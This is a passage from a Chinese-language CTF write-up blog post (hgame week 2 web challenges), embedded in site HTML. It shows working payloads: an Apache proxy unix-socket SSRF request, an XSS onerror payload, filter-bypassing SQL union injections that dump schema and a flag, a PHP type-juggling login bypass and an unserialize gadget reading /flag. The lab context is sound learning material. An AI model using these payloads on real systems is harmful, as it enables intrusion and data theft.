/proxy/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://internal.host/flag HTTP/1.1</span><br><span class="line">Host: localhost:80</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: _ga=GA1.2.472555996.1642680122; __gads=ID=ffd6fa567afacd7b-22ce67c00cd00047:T=1642680123:RT=1642680123:S=ALNI_MYrs7iSPv9n3RCqflSqd4vkDHHHBA</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Tue, 25 Jan 2022 08:39:02 GMT</span><br><span class="line">If-None-Match: &quot;22a-5d664045f9580&quot;</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
+
+<p>得到flag：<br><img src="https://s2.loli.net/2022/02/02/p9McqWPBViluATR.png"></p>
+<h2 id="webpack-engine"><a href="#webpack-engine" class="headerlink" title="webpack-engine"></a>webpack-engine</h2><p>又是一题网页源代码查找题，这题把flag藏在CSS里了。先点击几次按钮，然后页面跳转到《Never Gonna Give You Up》后翻开CSS即可找到flag：<br><img src="https://s2.loli.net/2022/02/02/OjyWP19hkwSNqdK.png"></p>
+<p>解两次base64得到flag：<br><img src="https://s2.loli.net/2022/02/02/p3Cvyj6WSJDB9so.png"></p>
+<h2 id="At0m的留言板"><a href="#At0m的留言板" class="headerlink" title="At0m的留言板"></a>At0m的留言板</h2><p>xss，做太少了，输出那块知识盲区了一波，直接给payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;this.alt=document.getElementsByTagName(&#x27;script&#x27;)[0].innerHTML&quot;/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>获得flag：<br><img src="https://s2.loli.net/2022/02/02/4jzMHsO7kxQbJvl.png"></p>
+<h2 id="Pokemon"><a href="#Pokemon" class="headerlink" title="Pokemon"></a>Pokemon</h2><p>sql注入题，我做的时候群里没给部分源码，所以是fuzz的，后面给了关键源码：<br><img src="https://s2.loli.net/2022/02/02/zVbwQ69AqMZaflE.png"></p>
+<p>因此双写绕过+联合注入就可以了，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">?code=1/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,group_concat(schema_name)/*/**/*/frfromom/*/**/*/infoorrmation_schema.schemata%23</span><br><span class="line"></span><br><span class="line">//information_schema,pokemon</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?code=1/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,group_concat(table_name)/*/**/*/frfromom/*/**/*/infoorrmation_schema.tables/*/**/*/whewherere/*/**/*/table_schema/*/**/*/like/*/**/*/&#x27;pokemon&#x27;%23</span><br><span class="line"></span><br><span class="line">//errors,fllllllllaaaaaag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?code=1/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,group_concat(column_name)/*/**/*/frfromom/*/**/*/infoorrmation_schema.columns/*/**/*/whwhereere/*/**/*/table_schema/*/**/*/like/*/**/*/&#x27;pokemon</span><br><span class="line">&#x27;/*/**/*/anandd/*/**/*/table_name/*/**/*/like/*/**/*/&#x27;fllllllllaaaaaag&#x27;</span><br><span class="line">%23</span><br><span class="line"></span><br><span class="line">//flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?code=1/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,group_concat(flag)/*/**/*/frfromom/*/**/*/fllllllllaaaaaag%23</span><br><span class="line"></span><br><span class="line">//hgame&#123;C0n9r@tul4tiOn*Y0u$4r3_sq1_M4ST3R#&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="一本单词书"><a href="#一本单词书" class="headerlink" title="一本单词书"></a>一本单词书</h2><p>同样是提示<code>www.zip</code>，下载附件，发现好几个php，逐一审计代码，确定ping、save、admin_check这三个php文件与注入无关，login处有一个黑魔法绕过，get、index、evil三个文件有一个php反序列化考查。</p>
+<p>首先是<code>login.php</code>部分代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if ($_POST[&#x27;username&#x27;] != &#x27;adm1n&#x27;) &#123;</span><br><span class="line">    die(alert(&#x27;username or password is invalid&#x27;));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (is_numeric($_POST[&#x27;password&#x27;])) &#123;</span><br><span class="line">    die(alert(&#x27;密码不能设置为纯数字，我妈都知道(￣△￣；)&#x27;));</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ($_POST[&#x27;password&#x27;] == 1080) &#123;</span><br><span class="line">        $_SESSION[&#x27;username&#x27;] = &#x27;admin&#x27;;</span><br><span class="line">        $_SESSION[&#x27;unique_key&#x27;] = md5(randomString(8));</span><br><span class="line">        header(&#x27;Location: index.php&#x27;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        die(alert(&#x27;这你都能输错？&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码逻辑是验证账号为adm1n，密码为1080，但是密码不能为纯数字，黑魔法绕过即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username：adm1n     password：1080a</span><br></pre></td></tr></table></figure>
+
+<p>接着登陆成功进入后进入<code>index.php</code>页面，审计核心代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">async function fresh() &#123;</span><br><span class="line">    wordlist.innerHTML = &quot;&quot;</span><br><span class="line">    const pool = (await axios.get(&quot;/get.php&quot;)).data</span><br><span class="line">    if (pool.length == 0) &#123;</span><br><span class="line">        pool[&#x27;abandon&#x27;] = &#x27;放弃&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    for (const key in pool) &#123;</span><br><span class="line">        const value = JSON.stringify(pool[key])</span><br><span class="line">        const html = `&lt;li&gt;&lt;span&gt;$&#123;key&#125;-&gt;&lt;/span&gt; &lt;span&gt;$&#123;value&#125;&lt;/span&gt;&lt;/li&gt;`</span><br><span class="line">        wordlist.innerHTML += html</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要调用到<code>get.php</code>来做输入，接着审计<code>get.php</code>核心部分：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;evil.php&#x27;;</span><br><span class="line"></span><br><span class="line">// flag is in /flag</span><br><span class="line"></span><br><span class="line">function decode(string $data): Array &#123;</span><br><span class="line">    $result = [];</span><br><span class="line">    $offset = 0;</span><br><span class="line">    $length = \strlen($data);</span><br><span class="line">    while ($offset &lt; $length) &#123;</span><br><span class="line">        if (!strstr(substr($data, $offset), &#x27;|&#x27;)) &#123;</span><br><span class="line">            return [];</span><br><span class="line">        &#125;</span><br><span class="line">        $pos = strpos($data, &#x27;|&#x27;, $offset);</span><br><span class="line">        $num = $pos - $offset;</span><br><span class="line">        $varname = substr($data, $offset, $num);</span><br><span class="line">        $offset += $num + 1;</span><br><span class="line">        $dataItem = unserialize(substr($data, $offset));</span><br><span class="line"></span><br><span class="line">        $result[$varname] = $dataItem;</span><br><span class="line">        $offset += \strlen(serialize($dataItem));</span><br><span class="line">    &#125;</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数将传入的数据进行反序列化，但是只是别<code>|</code>后面的部分，因此在构建反序列化后要在最前面加上<code>|</code>，最后利用<code>evil.php</code>进行反序列化：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Evil &#123;</span><br><span class="line">    public $file=&#x27;/flag&#x27;;</span><br><span class="line">    public $flag;</span><br><span class="line"></span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        $content = file_get_contents($this-&gt;file);</span><br><span class="line">        if (preg_match(&quot;/hgame/&quot;, $content)) &#123;</span><br><span class="line">            $this-&gt;flag = &#x27;hacker!&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;flag = $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Evil;</span><br><span class="line">echo serialize($a);</span><br><span class="line"></span><br><span class="line">//O:4:&quot;Evil&quot;:2:&#123;s:4:&quot;file&quot;;s:5:&quot;/flag&quot;;s:4:&quot;flag&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后将反序列化写入网页获取flag：<br><img src="https://s2.loli.net/2022/02/02/scURBC5GakMgvxq.png"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># -ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/01/28/%E3%80%90hgame-week1%E3%80%91write-up/" rel="next" title="【hgame week1】write up">
+                <i class="fa fa-chevron-left"></i> 【hgame week1】write up
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">38</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRYPTO"><span class="nav-number"></span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RSA-Attack"><span class="nav-number">1.</span> <span class="nav-text">RSA Attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Chinese-Character-Encryption"><span class="nav-number">2.</span> <span class="nav-text">Chinese Character Encryption</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RSA-Attack-2"><span class="nav-number">3.</span> <span class="nav-text">RSA Attack 2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number"></span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A5%87%E5%A6%99%E5%B0%8F%E6%B8%B8%E6%88%8F"><span class="nav-number">1.</span> <span class="nav-text">奇妙小游戏</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E5%BC%A0%E6%80%AA%E6%80%AA%E7%9A%84%E5%90%8D%E7%89%87"><span class="nav-number">2.</span> <span class="nav-text">一张怪怪的名片</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%A0%E4%B8%8A%E5%BD%93%E4%BA%86-%E6%88%91%E7%9A%84%E5%BE%88%E5%A4%A7"><span class="nav-number">3.</span> <span class="nav-text">你上当了 我的很大</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#REVERSE"><span class="nav-number"></span> <span class="nav-text">REVERSE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#xD-MAZE"><span class="nav-number">1.</span> <span class="nav-text">xD MAZE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#upx-magic-0"><span class="nav-number">2.</span> <span class="nav-text">upx magic 0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fake-shell"><span class="nav-number">3.</span> <span class="nav-text">fake shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#creakme2"><span class="nav-number">4.</span> <span class="nav-text">creakme2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number"></span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Apache"><span class="nav-number">1.</span> <span class="nav-text">Apache!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#webpack-engine"><span class="nav-number">2.</span> <span class="nav-text">webpack-engine</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#At0m%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF"><span class="nav-number">3.</span> <span class="nav-text">At0m的留言板</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pokemon"><span class="nav-number">4.</span> <span class="nav-text">Pokemon</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E6%9C%AC%E5%8D%95%E8%AF%8D%E4%B9%A6"><span class="nav-number">5.</span> <span class="nav-text">一本单词书</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
